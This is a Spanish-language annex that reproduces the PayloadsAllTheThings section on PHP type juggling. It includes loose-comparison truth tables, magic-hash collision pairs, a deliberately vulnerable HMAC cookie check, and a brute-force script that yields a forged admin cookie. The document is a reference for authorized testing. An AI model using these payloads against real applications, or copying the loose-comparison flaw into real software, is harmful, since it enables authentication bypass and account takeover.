# Fallos de lógica de negocio: anexo de ejemplos de PayloadsAllTheThings

> **Uso:** elegir el bloque que corresponde al motor, versión y punto de entrada. Las líneas de un bloque pueden ser alternativas. Sustituir hosts, rutas, identificadores y dominios por los del laboratorio o alcance autorizado. Los ejemplos originales son referencias de sintaxis, no pruebas verificadas contra el objetivo.

**Documento de origen:** [Type Juggling/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Type%20Juggling/README.md), revisión fija 3ac27901c711. **Licencia:** [MIT de Swissky](../../LICENCIA_PATT.md).

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md)

## 1. Type Juggling / Loose Comparison

### Variantes presentes en tablas o texto del apartado

```text
== or !=
=== or !==
```

## 2. Loose Comparison / True Statements

### Variantes presentes en tablas o texto del apartado

```text
'0010e2'   == '1e3'
'0xABCdef' == ' 0xABCdef'
'0xABCdef' == '     0xABCdef'
'0x01'     == 1
'0x1234Ab' == '1193131'
'123'  == 123
'123a' == 123
'abc'  == 0
'' == 0 == false == NULL
'' == 0
0  == false
false == NULL
NULL == ''
0 == strcmp($_GET['username'], $password)
```

## 3. Loose Comparison / NULL Statements

### Variantes presentes en tablas o texto del apartado

```text
var_dump(sha1([]));
var_dump(md5([]));
```

## 4. Type Juggling / Magic Hashes

```php
<?php
var_dump(md5('240610708') == md5('QNKCDZO')); # bool(true)
var_dump(md5('aabg7XSs')  == md5('aabC9RqS'));
var_dump(sha1('aaroZmOk') == sha1('aaK1STfY'));
var_dump(sha1('aaO8zKZF') == sha1('aa3OFF9m'));
?>
```

## 5. Type Juggling / Metodología

```php
function validate_cookie($cookie,$key){
 $hash = hash_hmac('md5', $cookie['username'] . '|' . $cookie['expiration'], $key);
 if($cookie['hmac'] != $hash){ // loose comparison
  return false;
  
 }
 else{
  echo "Well done";
 }
}
```

```php
 // docker run -it --rm -v /tmp/test:/usr/src/myapp -w /usr/src/myapp php:8.3.0alpha1-cli-buster php exp.php
 for($i=1424869663; $i < 1835970773; $i++ ){
  $out = hash_hmac('md5', 'admin|'.$i, '');
  if(str_starts_with($out, '0e' )){
   if($out == 0){
    echo "$i - ".$out;
    break;
   }
  }
 }
 ?>
```

```php
 $cookie = [
  'username' => 'admin',
  'expiration' => 1539805986,
  'hmac' => '0'
 ];
```

### Variantes presentes en tablas o texto del apartado

```text
$hash
$username
$expiration
$hmac
1539805986 - 0e772967136366835494939987377058
$key = '';
```

---

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md) · [Licencia de origen](../../LICENCIA_PATT.md)
